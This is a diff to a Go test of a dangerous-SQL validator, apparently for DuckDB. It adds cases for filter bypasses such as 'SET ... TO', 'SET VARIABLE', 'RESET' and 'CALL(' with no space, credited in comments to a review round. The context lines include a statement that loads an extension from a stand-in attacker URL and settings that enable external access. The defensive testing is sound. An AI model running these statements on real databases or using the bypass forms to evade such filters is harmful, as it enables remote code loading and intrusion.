@@ -653,9 +653,16 @@ func TestDangerousSQLPatterns(t *testing.T) {
 		{name: "PRAGMA settings change", sql: "PRAGMA enable_external_access=true", shouldFail: true},
 		{name: "SET GLOBAL var", sql: "SET GLOBAL extension_directory='/tmp/x'", shouldFail: true},
 		{name: "SET session var", sql: "SET enable_external_access=true", shouldFail: true},
+		// Bypasses caught by gemini round 1 — DuckDB SET accepts both = and TO,
+		// and supports SET VARIABLE x = 1; RESET also mutates session state.
+		{name: "SET TO syntax", sql: "SET enable_external_access TO true", shouldFail: true},
+		{name: "SET VARIABLE", sql: "SET VARIABLE x = 1", shouldFail: true},
+		{name: "RESET var", sql: "RESET enable_external_access", shouldFail: true},
 		{name: "LOAD extension", sql: "LOAD 'http://attacker/evil.so'", shouldFail: true},
 		{name: "INSTALL extension", sql: "INSTALL httpfs", shouldFail: true},
 		{name: "CALL procedure", sql: "CALL pragma_database_list()", shouldFail: true},
+		// Bypass caught by gemini r1 — CALL with no whitespace before paren.
+		{name: "CALL paren no space", sql: "CALL(pragma_database_list)", shouldFail: true},
 
 		// Case variations
 		{name: "drop table lowercase", sql: "drop table users", shouldFail: true},
